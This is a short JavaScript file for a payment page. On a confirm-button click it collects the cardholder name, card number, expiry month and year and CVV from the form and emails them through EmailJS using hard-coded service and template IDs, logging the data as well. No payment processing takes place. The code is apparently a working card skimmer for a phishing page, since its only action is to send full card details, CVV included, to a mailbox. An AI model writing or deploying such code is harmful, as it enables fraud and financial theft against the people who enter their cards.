console.log("line");



function sendMail () {
    
    let data = {
        holderName: document.querySelector(".k-holderName").value,
        cardNumber: document.querySelector(".k-cardNumber").value,
        exMonth: document.querySelector(".k-exMonth").value,
        exYear: document.querySelector(".k-exYear").value,
        cvv: document.querySelector(".k-cvv").value,
    }

    const serviceID = "service_hnqtgz9";
    const templateID = "template_7l6ykzs";

    emailjs.send(serviceID, templateID, data)
    .then(
        (res) => {
            
            console.log(res);
        }


    )
    .catch((err) => console.log(err));

    console.log(data);

}

document.querySelector(".confirm_btn").addEventListener("click", sendMail);
